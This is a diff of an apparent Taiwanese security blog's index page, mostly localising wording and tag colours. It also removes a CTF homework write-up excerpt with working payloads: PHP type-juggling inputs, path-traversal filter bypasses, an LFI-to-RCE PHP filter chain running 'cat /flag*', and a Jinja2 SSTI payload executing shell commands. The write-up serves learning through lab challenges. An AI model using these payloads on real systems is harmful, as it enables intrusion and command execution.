@@ -5,8 +5,8 @@
     <meta charset="utf-8" />
     <title>OWL_D Blog</title>
     <meta name="author" content="owl_d" />
-    <meta name="description" content="專注於網絡安全、滲透測試和技術分享的技術部落格" />
-    <meta name="keywords" content="網絡安全, 滲透測試, CTF, 技術分享, 資安" />
+    <meta name="description" content="專注於網路安全、滲透測試和技術分享的技術部落格" />
+    <meta name="keywords" content="網路安全, 滲透測試, CTF, 技術分享, 資安" />
     <meta
         name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
@@ -45,7 +45,7 @@
             <div id="loading" v-show="loading">
                 <div id="loading-circle">
                     <h2>LOADING</h2>
-                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <p>載入過慢請開啟緩存 瀏覽器預設開啟</p>
                     <img src="/images/loading.gif" />
                 </div>
             </div>
@@ -158,8 +158,8 @@
         <span class="info">
             <div class="wrap">
                 <h1>OWL_D Blog</h1>
-                <h3>網絡安全與技術探索</h3>
-                <h5>專注於網絡安全、滲透測試和技術分享的技術部落格</h5>
+                <h3>網路安全與技術探索</h3>
+                <h5>專注於網路安全、滲透測試和技術分享的技術部落格</h5>
             </div>
         </span>
     </div>
@@ -204,34 +204,6 @@
 <p>程式只有把 ..&#x2F; 換掉<br>所以可以使用 …&#x2F;.&#x2F; 的方式來 bypass<br>…&#x2F;.&#x2F; 被換掉後會變成 ..&#x2F; 就一樣可以達成回到上一層的目的</p>
 <p><code>https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag</code><br>即取得flag</p>
 <p>p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ..&#x2F; 過濾掉</p>
-<h3 id="swirl"><a href="#swirl" class="headerlink" title="swirl"></a>swirl</h3><p>Stage 1: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 1 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) === md5($B))</span><br><span class="line">                echo &quot;&lt;a href=$stage2&gt;Go to stage2&lt;/a&gt;&quot;;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
-<p>弱型態比較，可以使用 md5(array型態) &#x3D; NULL 的性質來達成<br>payload: <code>?A[]=1&amp;B[]=2</code></p>
-<p>Stage 2:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">echo &#x27;&lt;h1&gt;👻 Stage 2 / 4&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A !== $B)&#123;</span><br><span class="line">        $is_same = md5($A) == 0 and md5($B) === 0;</span><br><span class="line">        if ($is_same)</span><br><span class="line">            echo (md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;);</span><br><span class="line">        else die(&#x27;ERROR: $is_same is false&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
-<p>關鍵點應該在這：<br><code>md5($B) ? &quot;QQ1&quot; : md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>看起來有點複雜，但我們可以一部分一部分拆開來看<br><code>md5($B) ? &quot;QQ1&quot; : (目標要到這邊)</code><br>可以看出來 b 必須得是 false，才能繼續往下<br>進到下一層後，<br><code>md5($A) == 0 ? &quot;&lt;a href=$stage3?page=swirl.php&gt;Go to stage3&lt;/a&gt;&quot; : &quot;QQ2&quot;</code><br>所以 md5($A) 必須得是0<br>整理一下條件：</p>
-<ol>
-<li>A 和 B 的值必須不同</li>
-<li>md5(A) 和 md5(B) 都必須等於 0</li>
-<li>md5(B) 必須為假值</li>
-</ol>
-<p>payload: <code>?A[]=1&amp;B[]=2</code></p>
-<p>有趣的事：<br>意外發現 payload: <code>?A=true&amp;B=false</code> 也行得通<br>可是我自己做了實驗<br><img src="https://hackmd.io/_uploads/rJX2pUxTJg.png" alt="image"><br>發現程式根本就應該跳到 QQ1 就算 QQ1 被調過了應該也要跳去 QQ2<br>到現在我還是不懂是什麼神奇的機制繞過的，我再研究看看</p>
-<p>Stage 3:<br>.. 會變成 .<br>那 …. 就會變成 .. 了！<br>payload: <code>....\config.php</code><br>(記得要打開網頁原始碼看！)<br><img src="https://hackmd.io/_uploads/Hkv_1tA31e.png" alt="image"></p>
-<p>Stage 4:<br>寫完這題發現 LCI 轉 RCE 真的是天才般的發現，太神了<br>先觀察題目source，會發現主要漏洞在：</p>
-<ol>
-<li>使用了 extract($_POST) 函數，直接將 POST 請求中的參數轉換為變數</li>
-<li>未經過濾的 include($👀) 語句，允許包含任意文件</li>
-</ol>
-<p>所以先試了一下 POST 👀&#x3D;&#x2F;etc&#x2F;passwd：<br>發現真的有回傳內容，代表 LFI 行得通<br><img src="https://hackmd.io/_uploads/B1P8D8gpkg.png" alt="image"></p>
-<p>可是 👀&#x3D;&#x2F;flag 或者  👀&#x3D;..&#x2F;..&#x2F;..&#x2F;flag.php 等等直接取 flag 的方式全部失敗<br>所以勢必得要 RCE 才能印出 flag 了</p>
-<p>這次攻擊主要採用 PHP filter chain 來達成<br><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md">https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md</a><br>指令：<code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /flag*&#39;); ?&gt;&quot;</code><br>送到 POST 的 👀 後面變取得 flag</p>
-<p>p.s. 最後我還用了 <code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;ls /&#39;); ?&gt;&quot;</code><br>回頭再看一下爲什麼當初試了快 5 個小時的 ..&#x2F;..&#x2F;flag.php 不管用<br>最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用<br><img src="https://hackmd.io/_uploads/S1r4DUe6yx.png" alt="image"></p>
-<h3 id="SSTI-waf1"><a href="#SSTI-waf1" class="headerlink" title="SSTI-waf1"></a>SSTI-waf1</h3><p>一開始先送送看 49 發現真的回應 49<br>那肯定得是個 SSTI 了！</p>
-<p><img src="https://hackmd.io/_uploads/B1xZc0yT1x.png" alt="image"><br>從source發現題目會擋掉 _ 底線<br>所以把底線用 <code>\5f</code> 來繞過<br>並且用 <code>attr</code> 代替 點 來做串接</p>
-<p>一開始先用ls &#x2F; 看根目錄有沒有值得注意的檔案<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')() &#125;&#125;</code><br>發現網頁回應：<br><img src="https://hackmd.io/_uploads/Sk3ycRJ6kx.png" alt="image"></p>
-<p>有 flag 檔案，cat 一下便可以得到解答<br>payload:<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() &#125;&#125;</code></p>
-
             
         </div>
     </div>
@@ -250,16 +222,16 @@
         
         <span class="tag">
             
-            <a href="/tags/CyberSecurity/" style="color: #00bcd4">CyberSecurity</a>
+            <a href="/tags/CyberSecurity/" style="color: #03a9f4">CyberSecurity</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/NCKUCTF/" style="color: #ff7d73">NCKUCTF</a>
+            <a href="/tags/NCKUCTF/" style="color: #00a596">NCKUCTF</a>
         </span>
         
     </div>
-    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/" class="go-post">阅读全文</a>
+    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -315,21 +287,21 @@
         
         <span class="tag">
             
-            <a href="/tags/PortSwigger/" style="color: #03a9f4">PortSwigger</a>
+            <a href="/tags/PortSwigger/" style="color: #00a596">PortSwigger</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/SQLi/" style="color: #00a596">SQLi</a>
+            <a href="/tags/SQLi/" style="color: #ff7d73">SQLi</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Self-learning/" style="color: #ff7d73">Self-learning</a>
+            <a href="/tags/Self-learning/" style="color: #03a9f4">Self-learning</a>
         </span>
         
     </div>
-    <a href="/2025/03/25/portswigger-sqli-writeup/" class="go-post">阅读全文</a>
+    <a href="/2025/03/25/portswigger-sqli-writeup/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -365,7 +337,7 @@
         
         
     </div>
-    <a href="/2025/03/24/hello-world/" class="go-post">阅读全文</a>
+    <a href="/2025/03/24/hello-world/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -416,16 +388,16 @@
         
         <span class="tag">
             
-            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/picoCTF/" style="color: #00a596">picoCTF</a>
+            <a href="/tags/picoCTF/" style="color: #00bcd4">picoCTF</a>
         </span>
         
     </div>
-    <a href="/2025/03/11/picoctf-2025-write-ups/" class="go-post">阅读全文</a>
+    <a href="/2025/03/11/picoctf-2025-write-ups/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -470,7 +442,7 @@
         
         <span class="tag">
             
-            <a href="/tags/XSS/" style="color: #03a9f4">XSS</a>
+            <a href="/tags/XSS/" style="color: #ff7d73">XSS</a>
         </span>
         
         <span class="tag">
@@ -479,7 +451,7 @@
         </span>
         
     </div>
-    <a href="/2025/03/08/xss-cheatsheat/" class="go-post">阅读全文</a>
+    <a href="/2025/03/08/xss-cheatsheat/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -538,16 +510,16 @@
         
         <span class="tag">
             
-            <a href="/tags/CyberSecurity/" style="color: #ffa2c4">CyberSecurity</a>
+            <a href="/tags/CyberSecurity/" style="color: #00a596">CyberSecurity</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/NCKUCTF/" style="color: #00a596">NCKUCTF</a>
+            <a href="/tags/NCKUCTF/" style="color: #03a9f4">NCKUCTF</a>
         </span>
         
     </div>
-    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/" class="go-post">阅读全文</a>
+    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -603,16 +575,16 @@
         
         <span class="tag">
             
-            <a href="/tags/Self-learning/" style="color: #ffa2c4">Self-learning</a>
+            <a href="/tags/Self-learning/" style="color: #00bcd4">Self-learning</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/pwn/" style="color: #00a596">pwn</a>
+            <a href="/tags/pwn/" style="color: #ff7d73">pwn</a>
         </span>
         
     </div>
-    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/" class="go-post">阅读全文</a>
+    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -661,16 +633,16 @@
         
         <span class="tag">
             
-            <a href="/tags/TSCCTF/" style="color: #00a596">TSCCTF</a>
+            <a href="/tags/TSCCTF/" style="color: #ffa2c4">TSCCTF</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/CTF/" style="color: #ff7d73">CTF</a>
+            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
         </span>
         
     </div>
-    <a href="/2025/01/16/2025-tscctf-writeup/" class="go-post">阅读全文</a>
+    <a href="/2025/01/16/2025-tscctf-writeup/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
@@ -680,11 +652,11 @@
     <div class="category-and-date">
         
         <span class="category">
-            <a href="/categories/%E7%B6%B2%E7%B5%A1%E5%AE%89%E5%85%A8/">
+            <a href="/categories/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                網絡安全
+                網路安全
             </a>
         </span>
         
@@ -700,7 +672,7 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="滲透測試基礎：保護系統的第一步"><a href="#滲透測試基礎：保護系統的第一步" class="headerlink" title="滲透測試基礎：保護系統的第一步"></a>滲透測試基礎：保護系統的第一步</h1><p>滲透測試，也稱為道德黑客（Ethical Hacking），是一種模擬真實攻擊者手段的安全評估方法，旨在發現系統中的安全漏洞並在攻擊者利用之前修復它們。本文將介紹滲透測試的基本概念、方法論和常用工具。</p>
+            <h1 id="滲透測試基礎：保護系統的第一步"><a href="#滲透測試基礎：保護系統的第一步" class="headerlink" title="滲透測試基礎：保護系統的第一步"></a>滲透測試基礎：保護系統的第一步</h1><p>滲透測試，也稱為道德駭客（Ethical Hacking），是一種模擬真實攻擊者手段的安全評估方法，旨在發現系統中的安全漏洞並在攻擊者利用之前修復它們。本文將介紹滲透測試的基本概念、方法論和常用工具。</p>
 <h2 id="滲透測試的定義與重要性"><a href="#滲透測試的定義與重要性" class="headerlink" title="滲透測試的定義與重要性"></a>滲透測試的定義與重要性</h2><p>滲透測試是一種授權的、合法的安全評估活動，旨在評估組織的安全控制措施的有效性。</p>
             
         </div>
@@ -715,40 +687,40 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/" style="color: #00bcd4">滲透測試</a>
+            <a href="/tags/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/" style="color: #03a9f4">滲透測試</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Kali-Linux/" style="color: #03a9f4">Kali Linux</a>
+            <a href="/tags/Kali-Linux/" style="color: #00a596">Kali Linux</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8E%83%E6%8F%8F/" style="color: #00bcd4">漏洞掃描</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8E%83%E6%8F%8F/" style="color: #03a9f4">漏洞掃描</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8%E8%A9%95%E4%BC%B0/" style="color: #ff7d73">安全評估</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8%E8%A9%95%E4%BC%B0/" style="color: #ffa2c4">安全評估</a>
         </span>
         
     </div>
-    <a href="/2024/03/24/pentesting-basics/" class="go-post">阅读全文</a>
+    <a href="/2024/03/24/pentesting-basics/" class="go-post">閱讀全文</a>
 </div>
 
 <div class="post">
     <a href="/2024/03/24/intro-to-cybersecurity/">
-        <h2 class="post-title">網絡安全入門：保護你的數位生活</h2>
+        <h2 class="post-title">網路安全入門：保護你的數位生活</h2>
     </a>
     <div class="category-and-date">
         
         <span class="category">
-            <a href="/categories/%E7%B6%B2%E7%B5%A1%E5%AE%89%E5%85%A8/">
+            <a href="/categories/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8/">
                 <span class="icon">
                     <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                網絡安全
+                網路安全
             </a>
         </span>
         
@@ -764,8 +736,8 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="網絡安全入門：保護你的數位生活"><a href="#網絡安全入門：保護你的數位生活" class="headerlink" title="網絡安全入門：保護你的數位生活"></a>網絡安全入門：保護你的數位生活</h1><p>在當今高度互聯的世界中，網絡安全不再只是IT專業人士的專屬領域，而是每個數位公民都應當具備的基本素養。本文將帶你了解網絡安全的基本概念，並提供一些實用的保護措施。</p>
-<h2 id="網絡安全的重要性"><a href="#網絡安全的重要性" class="headerlink" title="網絡安全的重要性"></a>網絡安全的重要性</h2><p>隨著我們的生活越來越依賴互聯網，我們的個人數據也越來越容易受到威脅。從網路銀行到社交媒體，從雲端存儲到智能家居，我們的數字足跡無處不在。</p>
+            <h1 id="網路安全入門：保護你的數位生活"><a href="#網路安全入門：保護你的數位生活" class="headerlink" title="網路安全入門：保護你的數位生活"></a>網路安全入門：保護你的數位生活</h1><p>在當今高度互聯的世界中，網路安全不再只是IT專業人士的專屬領域，而是每個數位公民都應當具備的基本素養。本文將帶你了解網路安全的基本概念，並提供一些實用的保護措施。</p>
+<h2 id="網路安全的重要性"><a href="#網路安全的重要性" class="headerlink" title="網路安全的重要性"></a>網路安全的重要性</h2><p>隨著我們的生活越來越依賴網際網路，我們的個人資料也越來越容易受到威脅。從網路銀行到社群媒體，從雲端儲存到智慧家居，我們的數位足跡無處不在。</p>
             
         </div>
     </div>
@@ -779,26 +751,26 @@
         
         <span class="tag">
             
-            <a href="/tags/%E7%B6%B2%E7%B5%A1%E5%AE%89%E5%85%A8/" style="color: #00bcd4">網絡安全</a>
+            <a href="/tags/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8/" style="color: #03a9f4">網路安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7/" style="color: #03a9f4">隱私保護</a>
+            <a href="/tags/%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7/" style="color: #00bcd4">隱私保護</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8%E6%84%8F%E8%AD%98/" style="color: #ffa2c4">安全意識</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8%E6%84%8F%E8%AD%98/" style="color: #00a596">安全意識</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%85%A5%E9%96%80%E6%8C%87%E5%8D%97/" style="color: #00a596">入門指南</a>
+            <a href="/tags/%E5%85%A5%E9%96%80%E6%8C%87%E5%8D%97/" style="color: #03a9f4">入門指南</a>
         </span>
         
     </div>
-    <a href="/2024/03/24/intro-to-cybersecurity/" class="go-post">阅读全文</a>
+    <a href="/2024/03/24/intro-to-cybersecurity/" class="go-post">閱讀全文</a>
 </div>
 
 
